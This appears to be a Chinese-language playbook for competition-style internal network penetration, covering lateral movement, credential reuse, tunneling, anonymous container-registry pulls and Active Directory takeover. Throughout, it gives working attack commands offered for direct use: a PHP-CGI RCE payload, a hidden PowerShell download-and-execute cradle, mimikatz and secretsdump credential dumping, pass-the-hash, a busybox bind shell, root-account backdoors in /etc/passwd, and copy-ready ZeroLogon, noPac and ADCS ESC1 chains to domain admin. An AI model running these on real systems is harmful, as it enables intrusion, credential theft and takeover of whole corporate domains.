# 内网横向（shell 里看到第二张网卡 / 内网段时开）

> 触发条件：`ip a`（Linux）/ `ipconfig /all`（Windows）出多网卡、`ip route` 有内网段、fscan 报网段存活、或拿到凭据想打别的机器。
> 核心循环：**扫 → 抓凭据 → 复用凭据再扫 → 拿下一台 → 重复**。比赛密码复用率极高，一套口令打全段是常态。

## 落脚点判断（当前机器是跳板）

```bash
# Linux
ip addr; ip route; cat /etc/hosts; arp -a; netstat -antp   # 看连着谁
# Windows
ipconfig /all; route print; arp -a; netstat -ano
net user /domain; net group "domain admins" /domain        # 在域里？
```

- 看到域（`DC=xx,DC=com`）→ 这台是域成员，目标是域控
- 只有网段 → 逐台打

## 扫描（带凭据二扫）

```bash
# 传 fscan 到跳板机（或本机能路由直达就直接扫）
fscan -h 10.10.2.0/24                # 裸扫+自带弱口令/漏洞
fscan -h 10.10.2.0/24 -user admin -pwdf C:\tools\SecLists\Passwords\Common-Credentials\Pwdb_top-1000.txt   # 带已抓到的口令字典再扫一轮（最重要的一轮）
fscan -h 10.10.2.0/24 -np -nopoc     # 只存活探测
```

- Linux 跳板没有 fscan → 用 bash 扫端口：`for i in $(seq 1 254); do (echo >/dev/tcp/10.10.2.$i/445) 2>/dev/null && echo $i alive; done`
- 通不了外网的跳板 → 从攻击机传工具：certutil / iwr / python http.server 起在可达接口

## 凭据复用优先级

1. 本机抓到的明文口令（mimikatz `sekurlsa::logonpasswords` / history / 配置文件）→ 全段 SSH、SMB、3389、mysql 试一遍
   （本机跑法：`wsl -d ghost -- python3 /mnt/c/tools/impacket-src/examples/secretsdump.py ...`，全部脚本在该目录）
2. 本机抓到的 NTLM hash → **PTH**（不需要明文）：
   - mimikatz：`sekurlsa::pth /user:x /domain:x /ntlm:hash`
   - impacket：`psexec.py -hashes :hash user@ip`、`wmiexec.py`、`smbexec.py`
3. `~/.ssh/id_rsa`、known_hosts → 直接跳下一台
4. 数据库配置里的凭据 → 内网 mysql/mssql/redis

## Windows 域内快攻（有域环境时）

| 认什么 | 打哪 |
|--------|------|
| 域用户账号 | `GetUserSPNs.py -request -dc-ip x domain/user:pass`（Kerberoasting 拉服务票 → hashcat 破） |
| 拿到任一域管凭据/hash | PTH 打域控 `psexec -hashes ... administrator@dc` → `lsadump::dcsync` 全域 hash |
| SMB 445 开且老系统 | ms17_010 / `psexec` 直登 |
| 3389 开 | 凭据直连 RDP（比赛允许，别犹豫） |
| DC 的 LDAP/389 | BloodHound（sharphound 采集）→ 最短提权路径图 |
| ms14-068（老域） | 域用户提权域管，pykek 一把梭 |

## ★ 跳板机 / 隧道三角（当"只能通过跳板机访问内网"时，2026-10 补）

> 场景：题面明确「**必须通过跳板机进行渗透，不能直接用自己的工具打靶场**」，
> 且跳板机**同一时间只能一人连接**、系统可能是 Windows 也可能是 Linux。
> 三条通路选一条即可，**先判"允许不允许搭隧道"再动手**（线下赛这条常是"待确认"，现场先问工作人员）。

### 通路 A：SSH 动态转发（SOCKS5）—— 最通用

```bash
# 在跳板机可用 ssh 的前提下，从本机开一个 SOCKS5
ssh -D 1080 <user>@<jump_host> -p <port>

# 浏览器：FoxyProxy 设 127.0.0.1:1080 (SOCKS5)
# Burp：Settings → Network → Connections → SOCKS proxy 填 127.0.0.1:1080
#   链路：浏览器 → Burp → SOCKS5(ssh) → 跳板机 → 内网目标
#   好处：Burp 能正常抓改包；缺点：只代理显式配了代理的工具
```

### 通路 B：sshuttle 透明转发（支持 DNS）—— 最省事

```bash
sshuttle -r <user>@<jump_host>:<port> <内网段>/24      # 例：172.16.0.0/16
# 之后浏览器/工具直连内网 IP 即可，不用配代理
# 抓包照样把 FoxyProxy 指到 Burp（本机路由由 sshuttle 接管）
```

**A 与 B 的取舍**：要**改包重放**为主选 A（Burp 直挂）；要**大面积扫描**为主选 B（透明，nmap/fscan 都能直接打）。

### 通路 C：单端口转发（只需看一个 Web，或禁止搭隧道时）

```bash
ssh -L 8080:172.16.2.21:80 <user>@<jump_host> -p <port>   # 本机 8080 → 内网 80
# 跳板机是 Windows 时用 netsh portproxy 或自带工具做等价转发
```

### 工具落地（跳板机不出网 / 本机工具传不进去时）

```bash
# 有 ssh 就用 scp 传上去
scp -P <port> ./fscan <user>@<jump_host>:~
# 无 scp：本机起 http.server（绑可达接口），跳板机侧 wget/curl 拉
python3 -m http.server 8000 --bind 0.0.0.0
```

**纪律与坑**
- **"跳板机同时只能一人连接"** ⇒ 本队提前分工谁用；要并发就等前面的人断开，**别反复重连把人挤掉**
- **跳板机系统不确定** ⇒ Windows / Linux 两套命令都备（`ipconfig` / `ip a`、`scp` / `certutil`）
- **先确认隧道政策**：明确禁止搭隧道时就**只在跳板机内部操作**（用平台自带工具库 + 通路 C 看 Web）
- 拿到跳板机后**先做的三件事**：`ip a`（定网段）→ 看 `/tmp` 与家目录（有无预置工具）→ **起持久通道**（见本文件 §节奏纪律 第 4 条）

## ★ 制品库 / 容器仓库「免登录」匿名拉镜像（比登录后越权更重，2026-10 补）

> 与 `web/idor-test.md §制品库 catalog` **不是一回事**：那条是「**登录后** catalog 把全站私有仓交出来」（IDOR 口径），
> 本条是「**根本不用凭据**就能匿名 pull 到别人镜像」。判分时前者要求"能拉到别人租户的仓"，后者要求"无凭据即拉到"。
> 实证出处：2026 京津冀长城杯线下决赛——凭据是从一台机器上的 CI 部署脚本里挖到的，
> 而真正取 flag 的一步是**用匿名 token 流程直接拉镜像层**。

```bash
# ① 先确认是 Harbor / registry 形态
GET https://<target>/                       → <title>Harbor</title>
GET /api/v2.0/systeminfo                    → {"auth_mode":"db_auth",...}
# ② 项目列表：多数部署此处【无需认证】
GET /api/v2.0/projects?page=1&page_size=100 → 项目名 + metadata.public
# ③ 某项目下的仓库列表（同样常免认证）
GET /api/v2.0/projects/<proj>/repositories
# ④ 直接打 registry v2 端点：要 token，但能【匿名】换
GET /v2/_catalog                                                → 401（正常）
GET /service/token?service=harbor-registry&scope=repository:<proj>/<repo>:pull
                                                                → 200 返回 Bearer token ★
# ⑤ 拿 token 拉 manifest → config → 各 layer
GET /v2/<proj>/<repo>/manifests/latest      (Authorization: Bearer <token>)
GET /v2/<proj>/<repo>/blobs/<config digest>
GET /v2/<proj>/<repo>/blobs/<layer digest>  → 解包，层里常直接有凭据/脚本/flag
```

**flag / 凭据常在哪**：镜像层的 `/etc/*/deploy.sh`、CI 脚本、`.env`、`config.json` —— **先解层，别只看 manifest**。

**认**：目标有 `/v2/`、`/api/v2.0/`、Harbor 标题；或从某台机器上拿到 `docker login -u xx -p yy` 一行。

**算成**：`/api/v2.0/projects` **免认证**列出项目且 `/v2/_catalog` 或匿名 token 流程**拉得到镜像层**（不是只能 login、只能拉官方公开镜像）。

**假点**：
- `/api/v2.0/projects` 回 401 ⇒ 该项目开了鉴权，**不等于** registry 关着 → **继续单独试 `/service/token` 匿名流程**（两者鉴权面常常不一致）
- 能列仓库名但 pull 403 ⇒ 只到"命名空间可见"，**不算拿到**
- 项目 `metadata.public=false` 但匿名 token 仍签发成功 ⇒ **这才是有价值的洞**
- 与 `S3/OSS 桶策略全开` 不同源：那条是对象存储，本条是配置仓库

- **SMB（445）**：psexec/wmiexec/atexec（impacket 套装）——有凭据首选
- **WMI（135）**：`wmiexec.py`，更少留痕
- **WinRM（5985）**：`evil-winrm -u x -p y -i ip`
- **RDP（3389）**：直接图形化，顺手看桌面 flag
- **SSH（22）**：Linux 间跳，authorized_keys 后门
- **数据库**：内网 mysql 弱口令 → UDF / 写 shell；mssql → xp_cmdshell
- **代理通道**：跳板机起 `frp`（VPS 起 frps、靶机跑 frpc）或 `earthworm/suo5` 反向 socks → 攻击机 proxychains 内网全域可达（fscan/nmap/MSF 全走代理）；**回连不通时（NAT/安全组只放特定端口）**：MSF 用 `bind_tcp` 正向（proxychains 直连靶机开的端口），不反弹
- **NAT 隔离正连 trick（国赛真题）**：入口机出网被禁、只开放 22/80 少数端口、反弹全部失败 → 能低权命令执行时：`busybox telnetd -p 22 -l /bin/bash` 占用 22 端口 → 正连 22 直接拿交互 shell → 改完密码/放好 key 再杀掉恢复原 sshd。同类思路：`sed`/`echo` 改 /etc/passwd+shadow 加已知密码的 root 账户

## 节奏纪律

1. 每拿一台：搜 flag → 抓凭据 → fscan 带新凭据再扫 → 继续跳。别拿一台玩半天
2. 域环境优先打域控：域控 = 全域凭据 + 通常自带高分 flag（国赛总决赛真题：只读域控直接读 administrator 桌面 flag 文件就是一道题）
3. 凭据做表：机器/账号/口令/hash/入口，每台新机器先过一遍旧凭据再找新洞
4. 跳板不稳 → 先起持久通道（ssh -D / frp / 添加用户），再继续打
5. **history 是横向路标（磐石真题）**：`~/.bash_history` 里翻出 `ssh -i id_rsa root@localhost` 类命令 = root 私钥就在本机，直接复用

## 假点

- 跳板机不通外网 → 工具落地走攻击机的内网可达接口（python http.server 绑 0.0.0.0），不是"没法传工具"
- PTH 报 `STATUS_ACCOUNT_DISABLED` → 换账号；`STATUS_LOGON_FAILURE` → hash 类型对错（LM:NTLM 格式）
- 域内打不动 → 先 BloodHound 找 ACL/委派路径，不是死磕域管
- fscan 报洞全炸 → 内网机补丁比外网全正常，回到凭据复用主线

## ★ 三条完整攻击链模板（照阶段走，每段都有判据与卡点）

> 来源：企业内网实战报告 + redamon AD Kill Chain + GOAD 靶场，2026-02 采集核对。
> **用法**：判断自己处在哪条链的哪一段，照那一段的"判据"确认、照"卡点"避坑。

### 模板 A：Web 打点 → 多级横向 → 域控（企业内网标准形状）

| 阶段 | 目的 | 具体命令 | 判据 | 常见卡点 |
|---|---|---|---|---|
| **A1 外网信息收集** | 定指纹锁 CVE | `dirsearch -u http://TARGET -x 404,503,403`；Wappalyzer 看组件 | 出现 `/phpinfo.php`、**`/cgi-bin/printenv.pl`** | 只扫目录不看泄露页 —— `printenv` 常直接吐出 `GATEWAY_INTERFACE=CGI/1.1` 与网站根目录 |
| **A2 入口利用** | 拿第一个 RCE | PHP CGI：`POST /php-cgi/php-cgi.exe?%add+cgi.force_redirect%3dXCANWIN+%add+allow_url_include%3don+%add+auto_prepend_file%3dphp%3a//input`，body `<?php die(system("whoami")); ?>`<br>Tomcat PUT 上传 webshell<br>S2-045（Content-Type OGNL）<br>文件上传：传 `.aspx` 马 | 回显 `whoami` = `administrator` / `nt authority\system` | **`system()` 裸调用带乱码 ⇒ 套 `die()` 包一层**；Yakit/BP 请求超时但目标已回连（别以为失败） |
| **A3 上线 C2** | 建立稳定控制 | 监听端口**别用 80**（改 5566 之类）；`Scripted Web Delivery` 出 `powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://<跳板机IP>:81/a'))"` | 目标上线；把 sleep 调小便于交互 | Burp 超时 ≠ 失败，看上线列表 |
| **A4 内网侦察** | 判断"在域里还是只在内网" | `net time /domain`；`systeminfo`；`ipconfig`；`arp -a` | **`net time /domain` 返回 DC 名 = 在域**；返回"找不到域控制器" = WORKGROUP | ★ **拿到 webshell 后优先做这一步，不是提权**（见 §假点 1） |
| **A5 建代理** | 让攻击机可达内网段 | CS 里 `socks 27836`；`/etc/proxychains4.conf` 末行写 `socks4 127.0.0.1 27836`；验证 `proxychains4 nmap -sT -Pn -p 445 TARGET` | 扫出内网存活主机与端口 | **漏 `-sT -Pn`**（见 §假点 2）；MSF 别用 `proxychains4 msf`，用 `set proxies socks4:127.0.0.1:27836` |
| **A6 横向取机器** | 打内网目标 | MS17-010：`set rhosts <内网目标>`；**`set lhost <跳板机内网IP>`**；端口冲突则 `set DisablePayloadHandler true`<br>PTH：`proxychains4 crackmapexec smb TARGET -u Administrator -p <明文> -x "whoami"` | 回连成功 = session；PTH 成功 = `(Pwn3d!)` | ★ **反弹目标必须是跳板机的内网 IP，不是你的 Kali**（Kali 不可达）；回连不通改正向上线 |
| **A7 凭据收割** | 找能横向的凭据 | 先 `whoami /priv` 看 `SeImpersonatePrivilege` → `GodPotato.exe -cmd "mimikatz.exe privilege::debug token::elevate lsadump::sam sekurlsa::logonpasswords exit"` | 拿到明文或 NTLM hash | ★ **SYSTEM 权限跑 mimikatz 抓不到明文**（见 §假点 3） |
| **A8 发现新网段** | 递归扩大 | `ipconfig`；`portscan 192.168.10.0/24 1-65535 arp 1024`；`route print` | 出现新网段（**实证：139→2→3→10 四段递进**） | 只打一个网段就收工 |
| **A9 打域控** | 一步到位 CVE | ZeroLogon / noPac / ESC1（见下"三条现成命令"）；或走 ACL 边（模板 B） | `secretsdump` 输出 `krbtgt` 行 | **ZeroLogon 打完必须还原机器账户口令，否则域崩** |
| **A10 全域导出** | 收尾 | `impacket-secretsdump -just-dc-ntlm "DOMAIN/Administrator:<hash或pass>@DC_IP" -outputfile ntds` | `ntds` 里出现 `krbtgt` | 权限是 `GetChanges`+`GetChangesAll`，不是"是管理员" |

### 模板 B：域内低权 → DCSync（纯 AD 链，无 Web 环节）

| 阶段 | 目的 | 具体命令 | 判据 | 常见卡点 |
|---|---|---|---|---|
| **B0 前置** | 确认可打 | `nmap -sS -p 80,88,135,139,389,443,445,464,636,3268,3389,5985,5986 --open TARGET` | **`88/389/445/636/3268` 同时出现 = 域控** | 只看到 445 就喊域控 |
| **B1 匿名枚举** | 零凭据摸底 | `enum4linux-ng -A $DC_IP`；`nxc smb $DC_IP -u '' -p '' --shares --users`；`nxc smb $DC_IP -u guest -p '' --pass-pol` | 拿到 `DOMAIN_SID`、**`LOCKOUT_THRESHOLD`**、`users.txt` | ★ **先读 `--pass-pol` 再谈喷洒**，否则锁全域 |
| **B2 AS-REP** | 无凭据取 hash | `impacket-GetNPUsers -dc-ip $DC_IP -usersfile users.txt -no-pass -format hashcat "$DOMAIN/"` | `asrep.hash` 非空 | 用户列表**没剔除 `krbtgt`/`Administrator`** |
| **B3 破 hash** | 出明文 | AS-REP：`hashcat -m 18200`；Kerberoast：`hashcat -m 13100 -r best64.rule` | `--show` 出 `user:password` | 无目标字典 → 先 `cewl` 从公开站点生成 |
| **B4 喷洒** | 拿可用域账号 | **安全算术 `max_sprays = LOCKOUT_THRESHOLD - 2`**；`nxc smb $DC_IP -u users.txt -p "$CAND" --continue-on-success --no-bruteforce`；两次不同口令**间隔 ≥30 分钟** | `(Pwn3d!)` | **阈值 ≤2 时不许喷洒**，只测已知凭据 |
| **B5 BloodHound** | 找最短路径 | `bloodhound-python -c All,LoggedOn -d $DOMAIN -u $USER -p $PASS -ns $DC_IP --zip` | 图里出现低权→DA 的边 | 采太多被杀 ⇒ 用 **DCOnly** 低噪采法 |
| **B6 走边** | 按边类型执行 | 见 `AD-CS与委派.md` §三「BloodHound 边→命令映射」 | 如 `added to Domain Admins` | ★ **走完边要回来重算路径**（新凭据常让路径变短） |
| **B7 ADCS 捷径** | 跳过半个链 | `certipy-ad find -u $USER@$DOMAIN -p $PASS -dc-ip $DC_IP -vulnerable -stdout` | 报 ESC1/ESC8 | **只看有无漏洞、不看 EKU** ⇒ 见 `AD-CS与委派.md` §假点 5 |
| **B8 DCSync** | 终点 | `impacket-secretsdump -just-dc-ntlm "$DOMAIN/$PRIV_USER:$PRIV_PASS@$DC_IP" -outputfile ntds` | 输出含 `krbtgt` | 权限是 `GetChanges`+`GetChangesAll` |
| **B9 金票据（可选）** | 持久化 | `impacket-ticketer -nthash $KRBTGT_NT -domain-sid $SID -domain $DOMAIN Administrator`；`KRB5CCNAME=... impacket-psexec -k -no-pass $DC_IP` | 拿到 DC 的 SYSTEM shell | `ticketer` 把 `.ccache` 写到**当前目录** ⇒ 先 `cd` 锚定 |

### 模板 C：内网仅有一条通路 → 代理链 → 域控（隧道优先）

| 阶段 | 目的 | 具体命令 | 判据 | 常见卡点 |
|---|---|---|---|---|
| **C1 选隧道** | 按出网条件选 | **能出网** → `chisel server --reverse -p 8000`（攻击机）+ `chisel client <ATTACKER>:8000 R:8088:127.0.0.1:8080`（靶机）<br>**要全局可达、不想天天 proxychains** → **ligolo**：`ip tuntap add ... mode tun ligolo` → `ligolo-proxy -selfcert` → 靶机 `./agent -connect <ATTACKER>:11601 -ignore-cert` → `tunnel_start --tun ligolo` → `add_route --route '240.0.0.1/32'`<br>**内网机不出网但能连跳板机** → 跳板机 `socat TCP-LISTEN:6666,fork,reuseaddr TCP:<ATTACKER>:6666` 中转 | ligolo 里 `ifconfig` 列出靶机网卡即通 | 见 §跳板机三通路 |
| **C2 内网扫描** | 找下一跳 | `proxychains4 nmap -sT -Pn -p 445,3389,5985,88,389 TARGET`；MSF 走自带代理 `set proxies socks4:127.0.0.1:27836` | 存活 + 端口 | **`-sS` 一定不通** |
| **C3 直达域控** | 打 CVE | ZeroLogon / noPac / ESC1（见下） | 见各条 | 见各条 |
| **C4 全域收尾** | 导出 + 还原 | `secretsdump` 导出；ZeroLogon 场景**`restorepassword.py` 还原** | `krbtgt` 到手 / 机器账户已还原 | — |

### ★ 三条"直达域控"的现成命令（照抄可用）

**① ZeroLogon（CVE-2020-1472）—— 必须含第 6 步还原**
```bash
# 1 先存原 hash（后面还原要对比）
proxychains4 secretsdump.py DOMAIN/Administrator:'PASS'@DC_IP -just-dc-user "DC$"
# 2 验漏洞
python3 zerologon_tester.py DC <DC_IP>          # Success = 存在
# 3 重置机器账户口令为空
python3 cve-2020-1472-exploit.py dc$ <DC_IP>
# 4 DCSync 全域
proxychains4 secretsdump.py DOMAIN/dc$@DC_IP -no-pass
# 5 PTH 拿域管
wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:<NT> DOMAIN/Administrator@DC_IP
# 6【还原】取本机 SAM/SYSTEM/SECURITY 导出机器账户 hex，再还原
reg save HKLM\SYSTEM system.save & reg save HKLM\SAM sam.save & reg save HKLM\SECURITY security.save
secretsdump.py -sam sam.save -system system.save -security security.save LOCAL
proxychains4 python3 restorepassword.py DC@DC -target-ip <DC_IP> -hexpass <机器账户hex>
```

**② noPac（CVE-2021-42278 + 2021-42287）—— 判据在票据大小**
```powershell
.\noPac.exe scan -domain DOMAIN -user U -pass P
# ★ 票据大小 537 ≈ 无 PAC → 可打；>1000 = 已加 PAC → 不可打（已修补）
.\noPac.exe -domain DOMAIN -user U -pass P /dc <DC_FQDN> /mAccount test /mPassword QWEasd123 /service cifs /ptt
net user admin QWEasd@123 /add /domain
net group "Domain Admins" admin /add /domain
```

**③ ADCS ESC1 —— 判据在 EKU 与 SID 扩展**
```bash
certipy-ad find -u user@domain -p pass -dc-ip DC_IP -vulnerable -stdout
certipy-ad req -u user@domain -p pass -ca CA_NAME -template VULN_TEMPLATE \
  -upn Administrator@domain -target DC_IP -dns-tcp -ns DC_IP -out admin
certipy-ad auth -pfx admin.pfx -dc-ip DC_IP
# ★ 现代 DC（2022-05 补丁后）必须带 -sid，否则报 Object SID mismatch
#   加：-sid S-1-5-21-...-500
# ★ PKINIT 被打死时的替代：走 Schannel/LDAPS
certipy-ad auth -pfx admin.pfx -ldap-shell
#   LDAP shell 内：change_password administrator <NewPass>   一次性拿 DA
```

## ★ 22 条假点总表（内网渗透最容易踩的）

| # | 现象 | 真相 | 怎么验证 |
|---|---|---|---|
| 1 | 拿到 webshell 后纠结提权 | **应先判"在不在域"**（`net time /domain` + `ipconfig` 多网卡 + `arp -a` 他段缓存） | 提权只在"需读 lsass / 写敏感目录"时才必要 |
| 2 | `proxychains4 nmap -sS` 扫不出东西 | **SOCKS 只承载完整 TCP 连接**，半开扫描的原始包不走代理 | 一律改 `-sT -Pn` |
| 3 | SYSTEM 权限跑 mimikatz 抓不到明文 | lsass 存的是"**当前登录用户**"的凭据，SYSTEM 不是登录用户 | 注入 Administrator 进程后重抓 |
| 4 | 内网目标永远不回连 | 反弹目标写成了攻击机 IP（不可达） | 改成**跳板机内网 IP**；或改正向上线 |
| 5 | PTH 全报 `STATUS_LOGON_FAILURE` | hash 正确但**账户名不匹配**（域账号 vs 本地账号） | 换账户名 / 加 `--local-auth` / 先用明文验证 |
| 6 | ZeroLogon 打完域崩 | 重置机器账户口令后**必须还原** | 跑 `restorepassword.py` |
| 7 | 喷洒把全域锁死 | 没读锁定策略 | 先 `nxc smb DC --pass-pol`，上限 = 阈值−2 |
| 8 | ESC1 报得出来打不动 | 模板 EKU 只有 ServerAuth | 改走 `certipy auth -ldap-shell` |
| 9 | BloodHound 跑不出路径 | 采集账户权限不够，ACL 边不全 | 用有读权限的账户重采（或 DCOnly） |
| 10 | `net time /domain` 报 RPC 错 | 域控挡了 RPC，**不代表出了域** | 用 LDAP 389 验证连通 |
| 11 | 域内打不动就死磕域管 | 应先看 ACL/委派路径 | BloodHound + `AD-CS与委派.md` 决策树 |
| 12 | 只看 445 就认定域控 | 域控要 `88/389/445/636/3268` 组合 | 全端口扫 |
| 13 | 机器账户爆破当普通用户爆 | 机器账户口令默认 120 天轮换且 30 字符随机 | 别在机器账户上耗 |
| 14 | `secretsdump` 报权限不足 | 需要 `GetChanges`+`GetChangesAll`，不是"管理员就行" | 用 `dacledit` 给自己加权限 |
| 15 | 拿到 hash 但解不开 | 可能是 **LM 部分为空**（现代系统） | 只取后半段 NTLM |
| 16 | 内网扫描扫到洞但打不动 | **内网机补丁比外网全** | 回凭据复用主线，别死磕漏洞 |
| 17 | 代理通了但工具不走代理 | 部分工具不读 `proxychains` 环境 | 用工具自带的 `--proxy`（如 MSF 的 `set proxies`） |
| 18 | ligolo 起来了但路由不通 | 没加路由 | `add_route --route '240.0.0.1/32'` |
| 19 | chisel 连上了但端口不通 | 反向端口映射方向写反 | `R:` 是远端监听，`--reverse` 在 server 端 |
| 20 | 抓到 Net-NTLMv2 但解不开 | Net-NTLMv2 **不是 NTLM hash**，不能直接 PTH | 只能中继（relay）或爆字典 |
| 21 | 域控时间不同步导致 Kerberos 失败 | Kerberos 要求时钟偏差 <5 分钟 | 同步时间或从 DC 取时间 |
| 22 | `ticketer` 生成的 `.ccache` 找不到 | 它写到**当前工作目录** | 先 `cd` 再跑，或用绝对路径 |
